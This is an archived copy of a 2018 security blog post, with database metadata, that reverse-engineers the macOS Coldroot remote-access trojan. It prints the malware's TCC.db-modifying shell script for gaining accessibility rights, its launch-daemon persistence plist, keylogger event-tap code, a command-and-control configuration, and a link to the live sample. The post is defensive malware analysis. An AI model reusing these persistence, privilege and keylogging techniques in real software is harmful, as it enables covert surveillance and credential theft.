{
    "id": "be151cec-dc81-4481-8148-6dd2b293bdb1",
    "created_at": "2023-01-12T14:58:51.433136Z",
    "updated_at": "2025-03-27T02:16:26.39844Z",
    "deleted_at": null,
    "sha1_hash": "fefe5841f45f17a020e9a6626d160edd96f20023",
    "title": "2018-02-17 - Tearing Apart the Undetected (OSX)Coldroot RAT",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:46Z",
    "file_modification_date": "2022-05-29T01:22:46Z",
    "file_size": 1680855,
    "plain_text": "# Objective-See\n\n**objective-see.com/blog/blog_0x2A.html**\n\nTearing Apart the Undetected (OSX)Coldroot RAT\n\nâ€º analyzing the persistence, features, and capabilities of a cross-platform backdoor\n\n02/17/2018\n\n[love these blog posts? support my tools & writing on patreon :)](https://www.patreon.com/objective_see)\n\n[Want to play along? I've shared the malware, which can be downloaded here (password: infect3d).](https://objective-see.com/downloads/malware/Coldroot.zip)\n\nBackground\n\n[Next month, I'm stoked to be presenting some new research at SyScan360 in Singapore. Titled, \"Synthetic](https://www.syscan360.org/)\n_Reality; Breaking macOS One Click at a Time\" my talk will discuss a vulnerability I found in all recent_\nversions of macOS that allowed unprivileged code to interact with any UI component including 'protected'\nsecurity dialogs. Though reported and now patched, it allowed one to do things like dump passwords from\nthe keychain or bypass High Sierra's \"Secure Kext Loading\" - in a manner that was invisible to the user ðŸ™ˆ.\n\nAs part of my talk, I'm covering various older (and currently mitigated) attacks, which sought to dismiss or\navoid UI security prompts. Think, (ab)using AppleScript, sending simulated mouse events via core\ngraphics, or directly interacting with the file system. An example of the latter was DropBox, which directly\nmodified macOS's 'privacy database' (TCC.db) which contains the list of applications that are afforded\n'accessibility' rights. With such rights, applications can then interact with system UIs, other applications,\nand even intercept key events (i.e. keylogging). By directly modifying the database, one could avoid the\nobnoxious system alert that is normally presented to the user:\n\n\n-----\n\nThough Apple now thwarts this attack, by protecting TCC.db via System Integrity Protection (SIP) - various\nmacOS keyloggers still attempt to utilize this 'attack.' I figured one of these keyloggers would be a good\naddition to my slides as an illustrative example.\n\nHopping over to VirusTotal, I searched for files containing references to the TCC.db database, which\nreturned a handful of hits:\n\n\n-----\n\nBesides a variety of CounterStrike hacks (csgohack.app), and (known) keyloggers (FreeKeylogger.dmg,\n[KeyLogger.BlueBlood.A), an unflagged file named com.apple.audio.driver2.app (SHA-256:](https://www.virustotal.com/#/file/c20980d3971923a0795662420063528a43dd533d07565eb4639ee8c0ccb77fdf/detection)\nc20980d3971923a0795662420063528a43dd533d07565eb4639ee8c0ccb77fdf) caught my eye. It was\nrecently submitted for a scan, in early January.\n\n\n-----\n\nN t Al V ll (@ l ll) i t d t it' lik l th t th i i l fil\n\n\n-----\n\ncom.apple.audio.driver.app, which corresponds to internal strings within the binary. Thus we'll refer to this\nsample's application bundle as com.apple.audio.driver.app for the rest of this post.\n\nThough currently no AV-engine on VirusTotal flags this application as malicious, the fact it contained a\nreference to (TCC.db) warranted a closer look.\n```\n __const:001D2804 text \"UTF-16LE\", 'touch /private/var/db/.AccessibilityAPIEnabled && s'\n __const:001D2804 text \"UTF-16LE\", 'qlite3 \"/Library/Application Support/com.apple.TCC/'\n __const:001D2804 text \"UTF-16LE\", 'TCC.db\" \"INSERT or REPLACE INTO access (service, cl'\n __const:001D2804 text \"UTF-16LE\", 'ient, client_type, allowed, prompt_count) VALUES (',27h\n __const:001D2804 text \"UTF-16LE\", 'kTCCServiceAccessibility',27h,', ',27h,0\n\n```\n[Using Digita Security's UXProtect, I was also able to easily confirm that Apple has not silently pushed out](https://digitasecurity.com/product/uxprotect/)\nany XProtect signatures for the malware (to intrinsically protect macOS users):\n\nDetermining Malice\n\nMy first question was, \"is com.apple.audio.driver.app malicious?\"\n\nThough there is no exact science to arrive at a conclusive answer for this question, several (massive) 'red\nflags' stick out here. Flags, that clearly confirm the malicious nature of com.apple.audio.driver.app:\n\nAs mentioned, the application contains a reference to TCC.db. AFAIK, there is no legitimate or\nbenign reason why non-Apple code should ever reference this file!\n\n\n-----\n\n[The application is unsigned, though claims to be an Apple audio driver . My WhatsYourSign Finder](https://objective-see.com/products/whatsyoursign.html)\nextension, will display any signing information (or lack thereof) via the UI:\n\nThe application is packed with UPX. Though packing a binary doesn't make it malicious per se, it's\nrare to see a legitimate binary packed on macOS:\n```\n $ python isPacked.py com.apple.audio.driver.app\n scanning com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver\n UPX segments found\n binary is packed (packer: UPX)\n\n```\nFor it's main icon, the application uses macOS's standard 'document' icon to masquerade as a\ndocument. This is common tactic used by malware authors in order to trick user's in running their\nmalicious creations:\n\n\n-----\n\nWhen executed, the application displays a standard authentication prompt, requesting user\ncredentials. After the user enters their creds, then application performs no other readily visible action.\nThis is not normal application behavior:\n\nBehind the scenes the application persists itself as a launch daemon. This is a common method\nemployed by malware to ensure that it is automatically (re)started every time an infected system is\nrebooted. [BlockBlock will detect this persistence:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nAgain, behind the scenes, the application will automatically beacon out to a server. While creating a\nnetwork connection is itself not inherently malicious, it is a common tactic used by malware [specifically to check in with a command & control server for tasking. LuLu will intercept and alert on](https://objective-see.com/products/lulu.html)\nthis connection attempt:\n\nAt this point I was thoroughly convinced that though no AV-engine on VirusTotal flagged\ncom.apple.audio.driver.app, it was clearly malicious!\n\nLet's now dive in and reverse it to gain a deeper understanding of its actions and capabilities.\n\nAnalysis\n\nFirst, let's unpack the malware. Since it's packed with UPX, one can trivially unpack it via upx -d:\n```\n$ upx -d Contents/MacOS/com.apple.audio.driver \n            Ultimate Packer for eXecutables\n             Copyright (C) 1996 - 2013\n UPX 3.09    Markus Oberhumer, Laszlo Molnar & John Reiser  Feb 18th 2013\n With LZMA support, Compiled by Mounir IDRASSI (mounir@idrix.fr)\n    File size     Ratio   Format   Name\n  --------------------  ------  -----------  ----------  3292828 \n\n```\nOnce the malware has been unpacked, one of the first things we notice when reversing its binary, is that it\nwas apparently written in pascal. Though likely done to achieve cross-platform comparability, who the hell\nwrites pascal on macOS!?! Well apparently at least one person!\n\nHow do we know it was likely written in pascal? First, looking at the malware's entry point, main(), we see it\ncalling something named FPC_SYSTEMMAIN which in turn invokes a function named PASCALMAIN:\n\n\n-----\n\n```\n    _ ( g, g, g ) {\n  eax = _FPC_SYSTEMMAIN(arg2, arg1, arg2);\n  return eax;\n }\n int _FPC_SYSTEMMAIN(int arg0, int arg1, int arg2) {\n  *_U_$SYSTEM_$$_ARGC = arg0;\n  _SYSTEM_$$_SET8087CW$WORD();\n  eax = _PASCALMAIN();\n  return eax;\n }\n\n```\nNote that here, FPC stands for ['Free Pascal Compiler'](https://en.wikipedia.org/wiki/Free_Pascal)\n\nOther strings in the binary reference the Free Pascal Compiler (FPC) and reveal the presence of several\npascal libraries compiled into the malware:\n```\n $ strings -a Contents/MacOS/com.apple.audio.driver | grep FPC\n FPC 3.1.1 [2016/04/09] for i386 - Darwin\n FPC_RESLOCATION\n TLazWriterTiff - Typhon LCL: 5.7 - FPC: 3.1.1\n TTiffImage - Typhon LCL: 5.7 - FPC: 3.1.1\n\n```\nThe malware's malicious logic begins in the aforementioned PASCALMAIN function. Due to the presence\nof debug strings and verbose method names, reversing is actually quite easy!\n\nFirst, the malware loads it 'settings'. It does by first building a path to its settings file, then invoking the\nLOADSETTINGS function. If the loading succeeds it logs a \"LoadSettings ok\" message:\n```\n __text:00011DD4  call  _CUSTAPP$_$TCUSTOMAPPLICATION_$__$$_GETEXENAME$$ANSISTRING\n __text:00011DD9  mov   eax, [ebp+var_30]\n __text:00011DDC  lea   edx, [ebp+var_2C]\n __text:00011DDF  call  _SYSUTILS_$$_EXTRACTFILEPATH$RAWBYTESTRING$$RAWBYTESTRING\n __text:00011DE4  mov   eax, [ebp+var_2C]\n __text:00011DE7  call  _GLOBALVARS_$$_LOADSETTINGS$ANSISTRING$$BOOLEAN\n __text:00011DEC  test  al, al\n __text:00011DEE  jz   short loc_11DFB\n __text:00011DF0  lea   eax, (aLoadsettingsOk - 11D95h)[ebx] ; \"LoadSettings ok \"\n __text:00011DF6  call  _DEBUGUNIT_$$_WRITELOG$UNICODESTRING\n\n```\nWhere is the malware's setting file? Well if we look at the disassembly we can see it appending \"conx.wol\"\nto file path of the malware's binary (e.g com.apple.audio.driver.app/Contents/MacOS/) - and the checking if\nthat file exists:\n```\n __text:000683F3  lea   ecx, (aConxWol - 683A2h)[ebx] ; \"conx.wol\"\n __text:000683F9  call  fpc_ansistr_concat\n __text:000683FE  mov   eax, [ebp+var_14]\n __text:00068401  call  _SYSUTILS_$$_FILEEXISTS$RAWBYTESTRING$$BOOLEAN\n\n```\nA file monitor (such as macOS's built in fs_usage utility) dynamically reveals the path to this file, as the\nmalware opens and reads it during execution:\n\n\n-----\n\n```\n    _ g y\n access  (___F)  com.apple.audio.driver.app/Contents/MacOS/conx.wol\n open   F=3   (R_____) com.apple.audio.driver.app/Contents/MacOS/conx.wol\n flock  F=3   \n read   F=3   B=0x92\n close  F=3\n\n```\nOpening the settings file, \"conx.wol\", reveals the malware's configuration (in plaintext JSON):\n```\n $ cat com.apple.audio.driver.app/Contents/MacOS/conx.wol\n {\n  \"PO\": 80,\n  \"HO\": \"45.77.49.118\",\n  \"MU\": \"CRHHrHQuw JOlybkgerD\",\n  \"VN\": \"Mac_Vic\",\n  \"LN\": \"adobe_logs.log\",\n  \"KL\": true,\n  \"RN\": true,\n  \"PN\": \"com.apple.audio.driver\"\n }\n\n```\nThe meaning of the settings can be ascertained by their abbreviation and/or value. For example, 'PO' is\nport (HTTP, 80), 'HO' is host (attacker's command & control server at 45.77.49.118). 'MU' is likely 'mutex',\nwhile 'VN' is the name of the victim. The 'LN' value is the name of the log file for the keylogger ('KL'). I'm\nguessing 'RN' is for run normal - meaning the implant can run as a default user (vs. root). Finally 'PN' is the\nprocess name of the malware.\n\nOnce the malware has loaded its setting from conx.wol, it persistently installs itself. The logic for the install\nis contained in the '_INSTALLMEIN_$$_INSTALL' function:\n```\n__text:00011E12  lea   eax, (aInstallInit - 11D95h)[ebx] ; \"Install init \"\n__text:00011E18  call  _DEBUGUNIT_$$_WRITELOG$UNICODESTRING\n__text:00011E1D  call  _INSTALLMEIN_$$_INSTALL$$BOOLEAN\n\n```\nThe '_INSTALLMEIN_$$_INSTALL' performs the following steps:\n\n1. copies itself to /private/var/tmp/\n\n2. builds a launch daemon plist in memory\n\n3. writes it out to com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver.plist\n\n4. executes /bin/cp to install it into the /Library/LaunchDaemons/ directory\n\n5. launches the newly installed launch daemon via /bin/launchctl\n\nThe 'template' for the launch daemon plist is embedded directly in the malware's binary:\n\n\n-----\n\nOnce saved to disk we can easily dump the plist's contents:\n```\n$ cat /Library/LaunchDaemons/com.apple.audio.driver.plist \n <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ... >\n <plist version=\"1.0\">\n <dict>\n  <key>Label</key>\n  <string>com.apple.audio.driver</string>\n  <key>Program</key>\n  <string>/private/var/tmp/com.apple.audio.driver.app\n         /Contents/MacOS/com.apple.audio.driver</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/private/var/tmp/com.apple.audio.driver.app\n        /Contents/MacOS/com.apple.audio.driver</string>\n  </array>\n  <key>KeepAlive</key>\n  <true/>\n  <key>RunAtLoad</key>\n  <true/>\n  <key>UserName</key>\n  <string>root</string>\n </dict>\n\n```\nAs the RunAtLoad key is set to true, the OS will automatically start the malware anytime the infected\nsystem is rebooted.\n\n[We can dynamically watch the install unfold by simply running the malware, whilst ProcInfo (my open-](https://github.com/objective-see/ProcInfo)\nsource process monitor), is running:\n\n\n-----\n\n```\n    p\n //copy self to /private/var/tmp/\n process start:\n pid: 1222\n path: /bin/cp\n user: 501\n args: (\n  \"/bin/cp\",\n  \"-r\",\n  \"~/Desktop/com.apple.audio.driver.app/Contents/MacOS/../..\",\n  \"/private/var/tmp/com.apple.audio.driver.app\"\n )\n //copy launch daemon plist to /Library/LaunchDaemons\n process start:\n pid: 1230\n path: /bin/cp\n user: 0\n args: (\n  \"/bin/cp\",\n  \"~/Desktop/com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver.plist\",\n  \"/Library/LaunchDaemons\"\n )\n //launch daemon instance\n process start:\n pid: 1231\n path: /bin/launchctl\n user: 0\n args: (\n  \"/bin/launchctl\",\n  load,\n  \"/Library/LaunchDaemons/com.apple.audio.driver.plist\"\n )\n\n```\n[As previously noted, this persistent install attempt will trigger a BlockBlock alert:](https://objective-see.com/products/blockblock.html)\n\nThe astute reader will have noted that the install (copy) operation and launching of the daemon is executed\nas root (user: 0). The malware accomplishes this by executing these operation via it's\n_LETMEIN_$$_EXEUTEWITHPRIVILEGES$$BOOLEAN function.\n\n\n-----\n\nReversing this function reveals it simply invokes Apple s AuthorizationExecuteWithPrivileges function.\n'Under the hood' the OS invokes /usr/libexec/security_authtrampoline in order to execute the specified\nprocess as root (security_authtrampoline is setuid):\n```\n # ./procInfo\n process start:\n pid: 1232\n path: /usr/libexec/security_authtrampoline\n user: 501\n args: (\n  \"/usr/libexec/security_authtrampoline\",\n  \"/bin/launchctl\",\n  \"auth 3\",\n  start,\n  \"/Library/LaunchDaemons/com.apple.audio.driver.plist\"\n )\n\n```\nOf course in order for AuthorizationExecuteWithPrivileges to succeed, user credentials are required and\nmust be entered via an OS authentication prompt. The malware hopes the naive user will simply enter\nsuch credentials:\n\nBesides persistently installing itself as a launch daemon, the '_INSTALLMEIN_$$_INSTALL' function also\nattempts to provide the malware with accessibility rights (so that it may perform system-wide keylogging).\nIn order to gain such rights the malware first creates the /private/var/db/.AccessibilityAPIEnabled file and\nthen modifies the privacy database TCC.db, The former affords accessibility rights on older versions of\nmacOS.\n\nThe logic to enable accessibility rights, can be found in a bash script that the malware creates in\n/private/var/tmp/runme.sh:\n```\n $ cat /private/var/tmp/runme.sh\n #!/bin/sh\n touch /private/var/db/.AccessibilityAPIEnabled && \n sqlite3 \"/Library/Application Support/com.apple.TCC/TCC.db\" \"INSERT or \n  REPLACE INTO access (service, client, client_type, allowed, prompt_count) \n  VALUES ('kTCCServiceAccessibility', 'com.apple.audio.driver', 0, 1, 0);\"\n\n```\nThough this script is executed as root, on newer versions of macOS (Sierra+) it will fail as the privacy\ndatabase is now protected by SIP:\n\n\n-----\n\n```\n $ _\n ProductName: Mac OS X\n ProductVersion: 10.13.3\n $ ls -lartO@ /Library/Application\\ Support/com.apple.TCC/TCC.db \n -rw-r--r-- 1 root wheel restricted /Library/Application Support/com.apple.TCC/TCC.db\n\n```\nHowever, on older versions of OSX/macOS the malware will gain accessibility rights:\n\nAt this point, the malware is now fully persistently installed and will be started as root, each time the\ninfected system is (re)started:\n\n\n-----\n\nLet's now look at the malware's features and capabilities.\n\nEach time the malware is up and running it performs two main tasks:\n\n1. kicks off keylogging logic\n\n2. checks in with the command & control server and performs any received tasking\n\nThe keylogging logic (referred to as 'keyloser'), is started when the malware executes\n_KEYLOSER$_$TKEYLOGGERTHREAD_$__$$_CREATE$$TKEYLOGGERTHREAD from\nPASCALMAIN. The keylogger thread eventually invokes a function at 0x0006a950 which starts the actual\nkeylogging logic. Looking at its decompilation, it's easy to see that the malware is using Apple's\nCoreGraphics APIs to capture key presses:\n```\n int sub_6a950(int arg0, int arg1, int arg2, int arg3, int arg4) {\n eax = CGEventTapCreate(0x1, 0x0, 0x0, 0x1c00, 0x0, sub_6a3d0);\n if (eax != 0x0) {\n  CFRunLoopAddSource(CFRunLoopGetCurrent(), \n  CFMachPortCreateRunLoopSource(**_kCFAllocatorDefault, var_4, 0x0), **_kCFRunLoopCommonModes);\n  CGEventTapEnable(0x1, 0x1);\n  CFRunLoopRun();\n }\n ...\n return eax;\n }\n\n```\nAnd speaking of keylogging via CoreGraphics APIs, I'm actually also talking about this in my [SyScan360](https://www.syscan360.org/)\ntalk:\n\n\n-----\n\nAs we can see in the malware's code and my slide, to capture keystrokes: simply create an 'event tap',\nenable it, and add it to the current runloop (note that root/accessibility is requires to capture all key\npresses). Now, any time the user generates a key event, the OS will automatically call the callback function\nthat was specified in the call to CGEventTapCreate. For the malware, this is sub_6a3d0.\n\nThe code in the sub_6a3d0 function simply formats and logs the key press to file specified in the \"LN\"\nvalue of settings file: adobe_logs.log.\n\nBy 'tailing' the keylogger's log file, we can observe it in action...for example, logging my banking\ncredentials:\n\n\n-----\n\nOnce the keylogging thread is off and running, kicks off the main client thread via a call to\nCONNECTIONTHREAD$_$TMAINCLIENTTHREAD_$__$$_CREATE$BOOLEAN$$TMAINCLIENTTHREAD.\nThis first opens a connect to the malware's command & control server whose IP address and port are\nspecified in the malware's settings file, conx.wol:\n```\n $ cat com.apple.audio.driver.app/Contents/MacOS/conx.wol\n {\n  \"PO\": 80,\n  \"HO\": \"45.77.49.118\",\n  ...\n }\n\n```\nOnce a connection has been made, the OSX/Coldroot gathers some information about the infected host\n\n\n-----\n\nand sends it to the server. The survey logic is implemented in a function at address 0x000636c0, which\ncalls various functions such as 'GETHWIDSERIAL', 'GETUSERNAME', and 'GETRAMSIZEALL':\n```\n int sub_636c0() {\n  ...\n  _OSFUNCTIONS_$$_GETHWIDSERIAL$$ANSISTRING();\n  _OSFUNCTIONS_$$_GETUSERNAME$$ANSISTRING();\n  _OSFUNCTIONS_$$_GETOS$$ANSISTRING();\n  _OSFUNCTIONS_$$_GETRAMSIZEALL$$INT64();\n }\n\n```\nThese functions invoke various macOS utilities such as sw_vers, uname, and id to gather the required\ninformation:\n```\n # ./procInfo\n //get OS version\n process start:\n pid: 1569\n path: /usr/bin/sw_vers\n user: 501\n args: (\n  \"/usr/bin/sw_vers\"\n )\n //get architecture\n process start:\n pid: 1566\n path: /usr/bin/uname\n user: 501\n args: (\n  \"/usr/bin/uname\",\n  \"-m\"\n )\n //get user name\n process start:\n pid: 1567\n path: /usr/bin/id\n user: 501\n args: (\n  \"/usr/bin/id\",\n  \"-F\"\n )\n\n```\nIn a debugger (lldb), we can set a breakpoint on send and then dump the bytes being sent to the command\n& control server:\n\n\n-----\n\n```\n  d pp d d pp\n (lldb) target create \"com.apple.audio.driver.app\"\n Current executable set to 'com.apple.audio.driver.app' (i386).\n (lldb) b send\n (lldb) r\n Process 1294 stopped\n * thread #5, stop reason = breakpoint 1.1\n  frame #0: 0xa766a39f libsystem_c.dylib`send\n (lldb) x/3x $esp\n 0xb0596a9c: 0x00173a6d 0x00000003 0x03b2d1a8\n (lldb) x/100bx 0x03b2d1a8\n 0x03b2d1a8: 0x70 0x75 0x3f 0x00 0x48 0x6f 0x59 0xb0\n 0x03b2d1b0: 0x8e 0x8a 0x02 0x00 0x8c 0x75 0x3f 0x00\n 0x03b2d1b8: 0xae 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n 0x03b2d1c0: 0xad 0xde 0x02 0x00 0x00 0x00 0x00 0x00\n 0x03b2d1c8: 0x00 0x00 0x00 0x00 0x7b 0x22 0x56 0x65\n 0x03b2d1d0: 0x72 0x22 0x3a 0x31 0x2c 0x22 0x52 0x41\n 0x03b2d1d8: 0x4d 0x22 0x3a 0x30 0x2c 0x22 0x43 0x41\n 0x03b2d1e0: 0x4d 0x22 0x3a 0x66 0x61 0x6c 0x73 0x65\n 0x03b2d1e8: 0x2c 0x22 0x53 0x65 0x72 0x69 0x61 0x6c\n 0x03b2d1f0: 0x22 0x3a 0x22 0x78 0x38 0x36 0x5f 0x36\n 0x03b2d1f8: 0x34 0x5c 0x6e 0x22 0x2c 0x22 0x50 0x43\n 0x03b2d200: 0x4e 0x61 0x6d 0x65 0x22 0x3a 0x22 0x75\n 0x03b2d208: 0x73 0x65 0x72 0x5c\n (lldb) x/s 0x03b2d1cc\n 0x03b2d1cc: \"{\"Ver\":1,\"RAM\":0,\"CAM\":false,\"Serial\":\"x86_64\\n\",\"PCName\":\n \"user\\n - user\",\"OS\":\"Mac OS X10.13.2\",\"ID\":\"Mac_Vic\",\"AW\":\"N\\/A\",\"AV\":\"N\\/A\"}\"\n\n```\nNote that the malware actually prints this out to stdout as well:\n```\n (lldb) c\n JSON Packet : {\"Ver\":1,\"RAM\":0,\"CAM\":false,\"Serial\":\"x86_64\\n\",\"PCName\":\n  \"user\\n - user\",\"OS\":\"Mac OS X10.13.2\",\"ID\":\"Mac_Vic\",\"AW\":\"N\\/A\",\"AV\":\"N\\/A\"}\n PC info sent ..\n\n```\nIf we allow the malware to continue, we can also capture this same data in a network monitoring tools such\nas WireShark:\n\n\n-----\n\nYou might be wondering why in the survey data sent to the command & control server, 'Serial' is set to\nx86_64 or why the'RAM' is set to 0.\n\nWell to generate the value for 'Serial', the malware executes uname with the -m flag...which return the\narchitecture of the system (not the serial, which could be retrieved via something like: ioreg -l | grep\nIOPlatformSerialNumber). For determining the amount of RAM, the malware invokes a function called\n'GETRAMSIZEALL'...this simply returns 0:\n```\n int _OSFUNCTIONS_$$_GETRAMSIZEALL$$INT64() \n {\n  return 0x0;\n }\n\n```\nOnce OSX/Coldroot has checked in, it will process any tasking returned from the command & control\nserver. The logic for this is implemented in the\n_NEWCONNECTIONS_$$_PROCESSPACKET$TIDTCPCLIENT$TIDBYTES function. This function\nparses out the command from the command & control server, and then processes (acts upon) it.\n\nIn disassembled code, this looks like the following:\n```\n __text:000691F7  call  _CONNECTIONFUNC_$$_BYTEARRAYTOMAINPACKET$TIDBYTES$$TMAINPACKET\n __text:000691FC  mov   eax, [ebp+command]\n __text:000691FF  test  eax, eax\n __text:00069201  jl   loc_6986B\n __text:00069207  test  eax, eax\n __text:00069209  jz   loc_692C9\n __text:0006920F  sub   eax, 2\n __text:00069212  jz   loc_692D9\n __text:00069218  sub   eax, 1\n __text:0006921B  jz   loc_6935E\n __text:00069221  sub   eax, 2\n __text:00069224  jz   loc_69374\n __text:0006922A  sub   eax, 1\n __text:0006922D  jz   loc_693EC\n __text:00069233  sub   eax, 1\n __text:00069236  jz   loc_694AA\n __text:0006923C  sub   eax, 2\n __text:0006923F  jz   loc_695A2\n ...\n\n```\n\n-----\n\nVia static analysis, we can determine what commands are supported by the malware. Let's look at an\nexample of this.\n\nWhen the malware receives command #7 from the command & control server, it executes the logic at\n0x000694aa. In the same block of code it contains the debug string \"Delete File : \", a call to function\nnamed 'DELETEFILEFOLDER', and other debug string, \"{{{{ Delete OK Lets test }}}}\":\n```\n __text:000694DA  lea   edx, (aDeleteFile - 6914Bh)[ebx] ; \"Delete File : \"\n __text:000694E0  lea   eax, [ebp+var_D8]\n __text:000694E6  call  fpc_unicodestr_concat\n __text:000694EB  mov   eax, [ebp+var_D8]\n __text:000694F1  call  _DEBUGUNIT_$$_WRITELOG$UNICODESTRING\n __text:00069504  mov   eax, [ebp+var_A4]\n __text:0006950A  call  _FILESFUNC_$$_DELETEFILEFOLDER$UNICODESTRING$$BOOLEAN\n __text:00069548  lea   eax, (aDeleteOkLetsTe - 6914Bh)[ebx] ; \"{{{ Delete OK Lets test }}}\"\n __text:0006954E  call  _DEBUGUNIT_$$_WRITELOG$UNICODESTRING\n\n```\nProbably safe to guess command #7 is the delete file (or directory) command! But let's confirm.\n\nThe 'DELETEFILEFOLDER' function calls\n_LAZFILEUTILS_$$_DELETEFILEUTF8$ANSISTRING$$BOOLEAN which in turn calls\n_SYSUTILS_$$_DELETEFILE$RAWBYTESTRING$$BOOLEAN which finally calls unlink (the system call\nto delete a file or directory).\n\nRepeating this process for the other commands reveals the following capabilities:\n\nfile/directory list\n\nfile/directory rename\n\nfile/directory delete\n\nprocess list\n\nprocess execute\n\nprocess kill\n\ndownload\n\nupload\n\nget active window\n\nremote desktop\n\nshutdown\n\n\n-----\n\nAll are self-explanatory and implemented in fairly standard ways (i.e. delete file calls unlink), save perhaps\nfor the remote desktop command.\n\nWhen the malware receives a command from the server to start a remote desktop session, it spawns a\nnew thread named: 'REMOTEDESKTOPTHREAD'. This basically sits in a while loop (until the 'stop remote\ndesktop' command is issued), taking and 'streaming' screen captures of the user's desktop to the remote\nattacker:\n```\n while ( /* should capture */ ) {\n ...\n  _REMOTEDESKTOP_$$_GETSHOT$LONGINT$LONGINT$WORD$WORD$$TIDBYTES(...);\n  _CONNECTIONFUNC_$$_CLIENTSENDBUFFER$TIDTCPCLIENT$TIDBYTES$$BOOLEAN();\n  _CLASSES$_$TTHREAD_$__$$_SLEEP$LONGWORD();\n }\n\n```\nIt should be noted that if no command or tasking is received from the command & control server, the\nmalware will simply continue beaconing...interestingly, sending the name of the user's active window in\neach heartbeat:\n```\n$ cat /private/var/tmp/com.apple.audio.driver.app/Contents/MacOS/conx.wol \n{\"PO\":1337,\"HO\":\"127.0.0.1\",\"MU\":\"CRHHrHQuw JOlybkgerD\",\"VN\":\"Mac_Vic\",\n \"LN\":\"adobe_logs.log\",\"KL\":true,\"RN\":true,\"PN\":\"com.apple.audio.driver\"}\n//local listener\n// note: non-printable characters removed\n$ nc -l 1337\n{\"Ver\":1,\"RAM\":0,\"CAM\":false,\"Serial\":\"x86_64\\n\",\"PCName\":\"user\\n - user\",\n \"OS\":\"Mac OS X10.13.2\",\"ID\":\"Mac_Vic\",\"AW\":\"N\\/A\",\"AV\":\"N\\/A\"}\n...\nCalculator\nSafari\nTerminal\n\n```\nAlright, that wraps up our reversing sessions of OSX/Coldroot. Let's now discuss some other interesting\naspects of the malware, such as its author, source-code, and business model!\n\nColdroot\nOnce the technical analysis of the malware was complete, I began googling around on the search term:\nColdzer0. Looking at the disassembly of OSX/Coldroot we can see this string embedded in the binary,\npurportedly identifying the author's handle:\n\n\n-----\n\n```\n _ _$$_ p\n  push  ebp\n  mov   ebp, esp\n  lea   esp, [esp-8]\n  mov   [ebp+var_4], ebx\n  call  $+5\n  pop   ebx\n  lea   eax, (aCodedByColdzer - 6992Fh)[ebx] ; \"Coded By Coldzer0 / Skype:Coldzer01 \"\n  call  _DEBUGUNIT_$$_WRITELOG$UNICODESTRING\n  mov   ebx, [ebp+var_4]\n  mov   esp, ebp\n  pop   ebp\n  retn\n\n```\nBesides revealing the likely identify of the malware author, this turns up:\n\n[source code for an old (incomplete) version of Coldroot](https://github.com/xlinshan/Coldroot)\n\n[an informative demo video of the malware](https://objective-see.com/images/blog/blog_0x2A/coldroot.mp4)\n\nThe source code, though (as noted), is both old and incomplete - provides some confirmation of our\n[analysis. For example, the PacketTypes.pas file contains information about the malware's protocol and](https://github.com/xlinshan/Coldroot/blob/master/PacketTypes.pas)\ntasking commands:\n\n\n-----\n\nThe demo video is rather neat as it provides further insight into Coldroot, visually illustrating how an\nattacker can build (and customize) deployable agents:\n\n\n-----\n\n...and also how they can be remotely interacted with, and tasked:\n\nThe video also confirms the fact that Coldroot is indeed a fully cross-platform 'remote admin tool' (RAT):\n\nIf you have some extra time on your hands, check the video, courtesy of Coldzer0:\n\nIn terms of the (apparent) hacker's plans for the Coldroot, he stated in the comments both its release date\n(1/1/2017) and that fact that it would be for sale:\n\n\n-----\n\nConclusions\nIn this blog post we provided a comprehensive technical analysis of the macOS agent of the cross-platform\nRAT OSX/Coldroot. Thought not particularly sophisticated, it's rather 'feature complete' and currently\nundetected all AV-engines on VirusTotal. Moreover, it is a good illustrative example that hackers continue\nto target macOS!\n\nAnd remember if you want to stay safe, running the latest version of macOS will definitely help! For one,\n(due to a bug in UPX?) the OS refuses to even run the malware:\n```\n $ lldb com.apple.audio.driver.app\n (lldb) r\n error: error: ::posix_spawnp ( pid => 1256, path = 'com.apple.audio.driver.app') \n        err = Malformed Mach-o file (0x00000058)\n\n```\nAlso, as mentioned Apple now protects TCC.db via SIP, so the system-wide keylogging capabilities of\nOSX/Coldroot should be mitigated.\n\nMoreover, my free tools such as [BlockBlock and](https://objective-see.com/products/blockblock.html) [LuLu can generically thwart such threats :)](https://objective-see.com/products/lulu.html)\n\n\n-----\n\nAnd if you are worried that you are infected, look for an unsigned launch daemon running out of\n/private/var/tmp/. [KnockKnock can help with this task:](https://objective-see.com/products/knockknock.html)\n\n\n-----\n\n[love these blog posts & tools? you can support them via patreon! Mahalo :)](https://www.patreon.com/objective_see)\n\nÂ© 2018 objective-see llc\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-02-17 - Tearing Apart the Undetected (OSX)Coldroot RAT.pdf"
    ],
    "report_names": [
        "2018-02-17 - Tearing Apart the Undetected (OSX)Coldroot RAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c91f7778-69aa-45fa-be0e-4ee33daf8fbd",
            "created_at": "2023-01-06T13:46:39.110148Z",
            "updated_at": "2025-03-27T02:00:02.998873Z",
            "deleted_at": null,
            "main_name": "NARWHAL SPIDER",
            "aliases": [
                "GOLD ESSEX",
                "TA544"
            ],
            "source_name": "MISPGALAXY:NARWHAL SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
